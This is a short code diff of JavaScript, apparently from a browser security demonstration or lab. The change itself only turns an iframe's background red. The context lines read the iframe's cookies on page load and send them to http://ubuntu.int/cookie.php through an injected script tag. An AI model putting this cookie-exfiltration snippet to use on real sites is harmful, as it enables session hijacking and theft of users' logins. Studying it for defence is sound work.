@@ -4,6 +4,7 @@
 window.onload = function(){
 		var iframe = document.getElementById("ifr");
 		var childCookies = iframe.contentWindow.document.cookie;
+		iframe.contentWindow.document.body.style.backgroundColor = "red";
 		script = document.createElement("script");
 		script.setAttribute("src","http://ubuntu.int/cookie.php?line="+childCookies);
 		document.body.appendChild(script);
